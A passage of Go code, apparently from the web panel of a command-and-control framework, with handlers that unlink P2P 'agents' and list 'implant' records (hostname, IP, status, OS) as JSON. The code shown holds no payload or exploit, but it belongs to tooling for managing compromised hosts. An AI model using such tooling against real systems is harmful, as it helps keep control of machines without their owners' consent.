		"p2p_mode":        "",
		"p2p_listen_addr": "",
	})
	slog.Info("P2P link removed", "parent", parentID, "child", childID)
	s.LogAuditRecord(c, "unlink_agent", "agent", childID, fmt.Sprintf("unlinked from parent %s", parentID), true, nil)
	c.Redirect(http.StatusSeeOther, "/agents/"+childID)
}

// handleListAgents returns all agents as JSON for dropdowns
func (s *Server) handleListAgents(c *gin.Context) {
	var agents []db.Implant
	s.db.Order("hostname asc").Find(&agents)
	type agentBrief struct {
		ID       string `json:"id"`
		Hostname string `json:"hostname"`
		IP       string `json:"ip"`
		Status   string `json:"status"`
		OS       string `json:"os"`
	}
	results := make([]agentBrief, 0, len(agents))
	for _, a := range agents {
		results = append(results, agentBrief{
			ID:       a.ID,
			Hostname: a.Hostname,
			IP:       a.IP,
			Status:   a.Status,
			OS:       a.OS,
		})
	}
	c.JSON(http.StatusOK, gin.H{"agents": results})
}

// handleListUnlinkedAgents returns agents without a parent for linking dropdown
func (s *Server) handleListUnlinkedAgents(c *gin.Context) {
	var agents []db.Implant
	s.db.Where("parent_id = '' OR parent_id IS NULL").Order("hostname asc").Find(&agents)
	c.JSON(http.StatusOK, agents)
}
